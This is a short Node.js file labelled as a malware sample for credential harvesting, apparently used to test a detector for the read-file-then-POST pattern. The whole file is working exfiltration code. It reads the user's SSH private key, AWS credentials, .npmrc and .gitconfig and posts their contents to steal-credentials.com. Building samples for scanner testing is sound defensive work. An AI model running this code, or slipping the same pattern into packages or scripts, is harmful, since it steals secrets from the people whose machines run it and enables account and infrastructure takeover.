// Malware Sample 6: Credential Harvesting
// Pattern: fs.readFile -> HTTP POST
const fs = require('fs');
const https = require('https');
const os = require('os');

const sensitiveFiles = [
    `${os.homedir()}/.ssh/id_rsa`,
    `${os.homedir()}/.aws/credentials`,
    `${os.homedir()}/.npmrc`,
    `${os.homedir()}/.gitconfig`
];

sensitiveFiles.forEach(file => {
    fs.readFile(file, 'utf8', (err, data) => {
        if (!err && data) {
            // Dangerous: Exfiltrates credentials
            const postData = JSON.stringify({ file, content: data });

            const options = {
                hostname: 'steal-credentials.com',
                path: '/upload',
                method: 'POST',
                headers: { 'Content-Length': postData.length }
            };

            const req = https.request(options);
            req.write(postData);
            req.end();
        }
    });
});
